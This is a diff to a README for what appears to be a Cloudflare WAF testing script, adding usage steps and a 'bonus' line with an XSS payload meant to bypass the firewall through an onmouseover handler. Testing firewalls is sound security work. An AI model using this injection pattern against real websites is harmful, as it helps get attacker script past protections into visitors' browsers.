@@ -4,3 +4,6 @@
 2. Add neccessary functions in functions.txt
 3. Add neccessary special characters in special_chars.txt
 4. Run command -> python3 cloudflaretest.py
+
+# Bonus : XSS WAF Bypass Payload
+"><a%20href="#"onmouseover="window.print()">xss</a>
